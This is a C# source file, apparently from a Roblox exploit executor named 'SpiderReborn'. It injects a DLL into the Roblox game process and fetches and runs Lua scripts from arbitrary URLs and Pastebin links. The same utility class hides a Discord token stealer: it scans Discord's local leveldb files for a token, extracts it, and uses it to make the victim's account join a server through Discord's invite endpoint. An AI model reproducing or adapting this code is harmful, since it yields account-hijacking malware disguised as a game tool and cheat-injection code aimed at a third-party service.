using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace SpiderReborn_WPF
{
    internal class Functions
    {
        public static string exploitdllname = "SpiderCoreWrapper.dll";
        public static OpenFileDialog openfiledialog;
        private static DateTime startTime;

        [DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetStdHandle(int nStdHandle);

        [DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto, SetLastError = true)]
        private static extern int AllocConsole();

        [DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
        private static extern bool FreeConsole();



        public static void Inject()
        {
            Functions.startTime = DateTime.Now;
            if (NamedPipes.NamedPipeExist(NamedPipes.luapipename))
            {
                MessageBox.Show("Aready Injected", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            if (!NamedPipes.NamedPipeExist(NamedPipes.luapipename))
            {
                switch (Injector.DllInjector.GetInstance.Inject("RobloxPlayerBeta", AppDomain.CurrentDomain.BaseDirectory + Functions.exploitdllname))
                {
                    case Injector.DllInjectionResult.DllNotFound:
                        MessageBox.Show("Dll Is Missing, Try Launching The Boostrapper!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        return;
                    case Injector.DllInjectionResult.GameProcessNotFound:
                        MessageBox.Show("Roblox Was Not Found!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        return;
                    case Injector.DllInjectionResult.InjectionFailed:
                        MessageBox.Show("Injection Failed!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        return;
                }
            }
        }
        public static void PopulateListBox(ListBox lsb, string Folder, string FileType)
        {
            foreach (FileInfo file in new DirectoryInfo(Folder).GetFiles(FileType))
                lsb.Items.Add((object)file.Name);
        }

        public static string ConvertArgs(string argstring)
        {
            string[] strArray = argstring.Replace("(", "").Replace(")", "").Split(',');
            string str1 = "";
            foreach (string str2 in strArray)
            {
                string str3 = str2.Trim();
                if (new Regex("\".+\"").IsMatch(str3))
                {
                    string str4 = str3.Replace("\"", "");
                    str1 += string.Format("pushstring {0}\r\n", (object)str4);
                }
                else if (double.TryParse(str3, out Functions.Ignored<double>.Ignore))
                {
                    string str4 = str3.Replace("\"", "");
                    str1 += string.Format("pushnumber {0}\r\n", (object)str4);
                }
                else if (bool.TryParse(str3, out Functions.Ignored<bool>.Ignore))
                {
                    string str4 = str3.Replace("\"", "");
                    str1 += string.Format("pushboolean {0}\r\n", (object)str4);
                }
            }
            return str1;
        }

        public static string ConvertString(string input)
        {
            string[] strArray1 = input.Split("\r\n".ToCharArray());
            string str1 = "";
            foreach (string str2 in strArray1)
            {
                string[] strArray2 = str2.Split('.');
                if (str2.Contains("="))
                {
                    string[] strArray3 = str2.Split('=')[0].Trim().Split('.');
                    string[] strArray4 = str2.Split('=')[1].Trim().Split('.');
                    bool flag = false;
                    string argstring = "";
                    foreach (string str3 in strArray4)
                    {
                        if (strArray4.Length == 1)
                        {
                            flag = true;
                            argstring = str3;
                            break;
                        }
                        if (str3 == "")
                            str1 += "\b\r\n";
                        else if (str3.Contains<char>(':') && str3 == ((IEnumerable<string>)strArray4).First<string>())
                        {
                            string[] strArray5 = str3.Split(':');
                            foreach (string input1 in strArray5)
                            {
                                str1 = !(input1 == ((IEnumerable<string>)strArray5).First<string>()) ? str1 + string.Format("getfield -1, {0}\r\n", (object)Regex.Replace(input1, "\\(([^)]*)\\)", "")) : str1 + string.Format("getglobal {0}\r\n", (object)Regex.Replace(input1, "\\(([^)]*)\\)", ""));
                                if (input1.Contains("()"))
                                    str1 += "pushvalue -2\r\npcall 1 1 0\r\n";
                                else if (Regex.IsMatch(input1, "\\(([^)]*)\\)"))
                                    str1 = str1 + "pushvalue -2\r\n" + Functions.ConvertArgs(Regex.Match(input1, "\\(([^)]*)\\)").ToString()) + string.Format("pcall {0} 1 0\r\n", (object)(Regex.Match(input1, "\\(([^)]*)\\)").ToString().Split(',').Length + 1));
                            }
                        }
                        else if (str3.Contains<char>(':'))
                        {
                            string str4 = str3;
                            char[] chArray = new char[1] { ':' };
                            foreach (string input1 in str4.Split(chArray))
                            {
                                str1 += string.Format("getfield -1 {0}\r\n", (object)Regex.Replace(input1, "\\(([^)]*)\\)", ""));
                                if (input1.Contains("()"))
                                    str1 += "pushvalue -2\r\npcall 1 1 0\r\n";
                                else if (Regex.IsMatch(input1, "\\(([^)]*)\\)"))
                                    str1 = str1 + "pushvalue -2\r\n" + Functions.ConvertArgs(Regex.Match(input1, "\\(([^)]*)\\)").ToString()) + string.Format("pcall {0} 1 0\r\n", (object)(Regex.Match(input1, "\\(([^)]*)\\)").ToString().Split(',').Length + 1));
                            }
                        }
                        else
                        {
                            str1 = !(str3 == ((IEnumerable<string>)strArray4).First<string>()) ? str1 + string.Format("getfield -1 {0}\r\n", (object)Regex.Replace(str3, "\\(([^)]*)\\)", "")) : str1 + string.Format("getglobal {0}\r\n", (object)Regex.Replace(str3, "\\(([^)]*)\\)", ""));
                            if (str3.Contains("()"))
                                str1 += "pcall 1 1 0\r\n";
                            else if (Regex.IsMatch(str3, "\\(([^)]*)\\)"))
                                str1 = str1 + Functions.ConvertArgs(Regex.Match(str3, "\\(([^)]*)\\)").ToString()) + string.Format("pcall {0} 1 0\r\n", (object)Regex.Match(str3, "\\(([^)]*)\\)").ToString().Split(',').Length);
                        }
                    }
                    int num = 0;
                    foreach (string str3 in strArray3)
                    {
                        if (str3 == "")
                        {
                            str1 += "\b\r\n";
                        }
                        else
                        {
                            ++num;
                            if (str3 == ((IEnumerable<string>)strArray3).Last<string>())
                                str1 = !flag ? str1 + string.Format("pushvalue -{0}\r\n", (object)num) + string.Format("setfield -2 {0}\r\n", (object)((IEnumerable<string>)strArray3).Last<string>().Trim()) : str1 + Functions.ConvertArgs(argstring) + string.Format("setfield -2 {0}\r\n", (object)((IEnumerable<string>)strArray3).Last<string>().Trim());
                            else if (str3.Contains<char>(':') && str3 == ((IEnumerable<string>)strArray3).First<string>())
                            {
                                string[] strArray5 = str3.Split(':');
                                foreach (string input1 in strArray5)
                                {
                                    str1 = !(input1 == ((IEnumerable<string>)strArray5).First<string>()) ? str1 + string.Format("getfield -1 {0}\r\n", (object)Regex.Replace(input1, "\\(([^)]*)\\)", "")) : str1 + string.Format("getglobal {0}\r\n", (object)Regex.Replace(input1, "\\(([^)]*)\\)", ""));
                                    if (input1.Contains("()"))
                                        str1 += "pushvalue -2\r\npcall 1 1 0\r\n";
                                    else if (Regex.IsMatch(input1, "\\(([^)]*)\\)"))
                                        str1 = str1 + "pushvalue -2 \r\n" + Functions.ConvertArgs(Regex.Match(input1, "\\(([^)]*)\\)").ToString()) + string.Format("pcall {0} 1 0)\r\n", (object)(Regex.Match(input1, "\\(([^)]*)\\)").ToString().Split(',').Length + 1));
                                }
                            }
                            else if (str3.Contains<char>(':'))
                            {
                                string str4 = str3;
                                char[] chArray = new char[1] { ':' };
                                foreach (string input1 in str4.Split(chArray))
                                {
                                    str1 += string.Format("getfield -1 {0}\r\n", (object)Regex.Replace(input1, "\\(([^)]*)\\)", ""));
                                    if (input1.Contains("()"))
                                        str1 += "pushvalue -2\r\npcall 1 1 0\r\n";
                                    else if (Regex.IsMatch(input1, "\\(([^)]*)\\)"))
                                        str1 = str1 + "pushvalue -2 \r\n" + Functions.ConvertArgs(Regex.Match(input1, "\\(([^)]*)\\)").ToString()) + string.Format("pcall {0} 1 0\r\n", (object)(Regex.Match(input1, "\\(([^)]*)\\)").ToString().Split(',').Length + 1));
                                }
                            }
                            else
                            {
                                str1 = !(str3 == ((IEnumerable<string>)strArray3).First<string>()) ? str1 + string.Format("getfield -1 {0}\r\n", (object)Regex.Replace(str3, "\\(([^)]*)\\)", "")) : str1 + string.Format("getglobal {0}\r\n", (object)Regex.Replace(str3, "\\(([^)]*)\\)", ""));
                                if (str3.Contains("()"))
                                    str1 += "pcall 1 1 0\r\n";
                                else if (Regex.IsMatch(str3, "\\(([^)]*)\\)"))
                                    str1 = str1 + Functions.ConvertArgs(Regex.Match(str3, "\\(([^)]*)\\)").ToString()) + string.Format("pcall {0} 1 0\r\n", (object)Regex.Match(str3, "\\(([^)]*)\\)").ToString().Split(',').Length);
                            }
                        }
                    }
                }
                else
                {
                    foreach (string str3 in strArray2)
                    {
                        if (str3 == "")
                            str1 += "\b\r\n";
                        else if (str3.Contains<char>(':') && str3 == ((IEnumerable<string>)strArray2).First<string>())
                        {
                            string[] strArray3 = str3.Split(':');
                            foreach (string input1 in strArray3)
                            {
                                str1 = !(input1 == ((IEnumerable<string>)strArray3).First<string>()) ? str1 + string.Format("getfield -1 {0}\r\n", (object)Regex.Replace(input1, "\\(([^)]*)\\)", "")) : str1 + string.Format("getglobal {0}\r\n", (object)Regex.Replace(input1, "\\(([^)]*)\\)", ""));
                                if (input1.Contains("()"))
                                    str1 += "pushvalue -2\r\npcall 1 1 0)\r\n";
                                else if (Regex.IsMatch(input1, "\\(([^)]*)\\)"))
                                    str1 = str1 + "pushvalue -2\r\n" + Functions.ConvertArgs(Regex.Match(input1, "\\(([^)]*)\\)").ToString()) + string.Format("pcall {0} 1 0\r\n", (object)(Regex.Match(input1, "\\(([^)]*)\\)").ToString().Split(',').Length + 1));
                            }
                        }
                        else if (str3.Contains<char>(':'))
                        {
                            string str4 = str3;
                            char[] chArray = new char[1] { ':' };
                            foreach (string input1 in str4.Split(chArray))
                            {
                                str1 += string.Format("getfield -1 {0}\r\n", (object)Regex.Replace(input1, "\\(([^)]*)\\)", ""));
                                if (input1.Contains("()"))
                                    str1 += "pushvalue -2\r\npcall 1 1 0\r\n";
                                else if (Regex.IsMatch(input1, "\\(([^)]*)\\)"))
                                    str1 = str1 + "pushvalue -2\r\n" + Functions.ConvertArgs(Regex.Match(input1, "\\(([^)]*)\\)").ToString()) + string.Format("pcall {0} 1 0\r\n", (object)(Regex.Match(input1, "\\(([^)]*)\\)").ToString().Split(',').Length + 1));
                            }
                        }
                        else
                        {
                            str1 = !(str3 == ((IEnumerable<string>)strArray2).First<string>()) ? str1 + string.Format("getfield -1 {0}\r\n", (object)Regex.Replace(str3, "\\(([^)]*)\\)", "")) : str1 + string.Format("getglobal {0}\r\n", (object)Regex.Replace(str3, "\\(([^)]*)\\)", ""));
                            if (str3.Contains("()"))
                                str1 += "pcall 1 1 0 \r\n";
                            else if (Regex.IsMatch(str3, "\\(([^)]*)\\)"))
                                str1 = str1 + Functions.ConvertArgs(Regex.Match(str3, "\\(([^)]*)\\)").ToString()) + string.Format("pcall {0} 1 0\r\n", (object)Regex.Match(str3, "\\(([^)]*)\\)").ToString().Split(',').Length);
                        }
                    }
                }
            }
            return str1;
        }

        static Functions()
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "Lua Script Txt (*.txt)|*.txt|All files (*.*)|*.*";
            openFileDialog.FilterIndex = 1;
            openFileDialog.RestoreDirectory = true;
            openFileDialog.Title = "Open File - SpiderReborn";
            Functions.openfiledialog = openFileDialog;
        }
        public static void ExecuteMain(string text)
        {
            if (NamedPipes.NamedPipeExist(NamedPipes.luapipename))
            {
                NamedPipes.LuaPipe(text);
            }
            else
            {
                MessageBox.Show("Please Inject " + Functions.exploitdllname + " Before Executing Something.", "Error While Executing", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
        }

        public static void Execute(string text)
        {
            if (NamedPipes.NamedPipeExist(NamedPipes.luapipename))
            {
                if (!text.StartsWith("https://"))
                {
                    Functions.ExecuteMain(text);
                }
                else
                {
                    if (text.StartsWith("https://pastebin.com/"))
                    {
                        WebClient wc = new WebClient();
                        if (text.StartsWith("https://pastebin.com/raw/"))
                        {
                            string textbox = text;
                            string idk = wc.DownloadString(textbox);
                            Functions.ExecuteMain(idk);
                        }
                        else
                        {
                            string text3 = text.Remove(0, 21);
                            string main = wc.DownloadString("https://pastebin.com/raw/" + text3);
                            Functions.ExecuteMain(main);
                        }
                    }
                    else if (text.StartsWith("https://"))
                    {
                        WebClient wc = new WebClient();
                        string text2 = text;
                        string MainText = wc.DownloadString(text2);
                        Functions.ExecuteMain(MainText);
                    }
                    else
                    {
                        MessageBox.Show("This Isnt A URL", "Please Put A URL", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
            }
            else
            {
                MessageBox.Show("Inject " + Functions.exploitdllname + " before Using this!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation); return;
            }
        }

        public static bool FindLdb(ref string path)
        {
            if (!Directory.Exists(path))
            {
                return false;
            }
            foreach (FileInfo fileInfo in new DirectoryInfo(path).GetFiles())
            {
                if (fileInfo.Name.EndsWith(".ldb") && File.ReadAllText(fileInfo.FullName).Contains("oken"))
                {
                    path += fileInfo.Name;
                    break;
                }
            }
            return path.EndsWith(".ldb");
        }

        public static bool FindLog(ref string path)
        {
            if (!Directory.Exists(path))
            {
                return false;
            }
            foreach (FileInfo fileInfo in new DirectoryInfo(path).GetFiles())
            {
                if (fileInfo.Name.EndsWith(".log") && File.ReadAllText(fileInfo.FullName).Contains("oken"))
                {
                    path += fileInfo.Name;
                    break;
                }
            }
            return path.EndsWith(".log");
        }


        public static string GetToken(string path, bool isLog = false)
        {
            byte[] bytes = File.ReadAllBytes(path);
            string @string = Encoding.UTF8.GetString(bytes);
            string text = "";
            string text2 = @string;
            while (text2.Contains("oken"))
            {
                string[] array = Sub(text2).Split(new char[]
                {
                    '"'
                });
                text = array[0];
                text2 = string.Join("\"", array);
                if (isLog && text.Length == 59)
                {
                    break;
                }
            }
            return text;
        }

        private static string Sub(string contents)
        {
            string[] array = contents.Substring(contents.IndexOf("oken") + 4).Split(new char[]
            {
                '"'
            });
            List<string> list = new List<string>();
            list.AddRange(array);
            list.RemoveAt(0);
            array = list.ToArray();
            return string.Join("\"", array);
        }



        public string Request(string method, string url, string postData, string token)
        {
            string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Discord\\Local Storage\\leveldb\\";
            HttpWebRequest httpWebRequest = WebRequest.CreateHttp(url);
            httpWebRequest.Method = method;
            httpWebRequest.Headers.Add("authorization", token);
            byte[] bytes = Encoding.UTF8.GetBytes(postData);
            httpWebRequest.ContentType = "application/x-www-form-urlencoded";
            httpWebRequest.ContentLength = (long)bytes.Length;
            httpWebRequest.Timeout = 2500;
            Stream requestStream = httpWebRequest.GetRequestStream();
            requestStream.Write(bytes, 0, bytes.Length);
            requestStream.Close();
            return new StreamReader(httpWebRequest.GetResponse().GetResponseStream()).ReadToEnd();
        }
        public static void JoinServer(string invite, string token)
        {
            try
            {
                Functions a = new Functions();
                a.Request("POST", "https://discordapp.com/Functions/v6/invite/" + invite, "a=b", token);
            }

            catch
            {

            }
        }

        public static class Ignored<T>
        {
            [ThreadStatic]
            public static T Ignore;
        }

    }
}